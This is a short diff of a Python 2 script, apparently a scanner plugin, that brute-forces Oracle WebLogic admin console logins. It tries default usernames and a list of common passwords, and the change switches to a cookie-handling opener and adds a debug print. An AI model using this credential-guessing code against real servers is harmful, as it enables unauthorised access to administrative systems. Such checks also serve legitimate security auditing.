@@ -7,19 +7,16 @@ def check(host,port,timeout):
     flag_list=['<title>WebLogic Server Console</title>','javascript/console-help.js','WebLogic Server Administration Console Home','/console/console.portal','console/jsp/common/warnuserlockheld.jsp','/console/actions/common/']
     user_list=['weblogic']
     pass_list=['weblogic','password','Weblogic1','weblogic10','weblogic10g','weblogic11','weblogic11g','weblogic12','weblogic12g','weblogic13','weblogic13g','weblogic123','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
-    try:
-        res = urllib2.urlopen(url+"/console/login/LoginForm.jsp")
-        cookies = res.headers['Set-Cookie']
-    except Exception,e:
-        return 'NO'
+    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
     for user in user_list:
         for password in pass_list:
             try:
                 PostStr='j_username=%s&j_password=%s&j_character_encoding=UTF-8'%(user,password)
-                request = urllib2.Request(url+'/console/j_security_check',PostStr)
-                request.add_header("Cookie",cookies)
-                res = urllib2.urlopen(request,timeout=timeout)
-                res_html = res.read()
+                request = opener.open(url+'/console/j_security_check',PostStr)
+                #request.add_header("Cookie",cookies)
+                #res = urllib2.urlopen(request,timeout=timeout)
+                res_html = request.read()
+                print res_html
             except urllib2.HTTPError,e:
                 return 'NO'
             except urllib2.URLError,e:
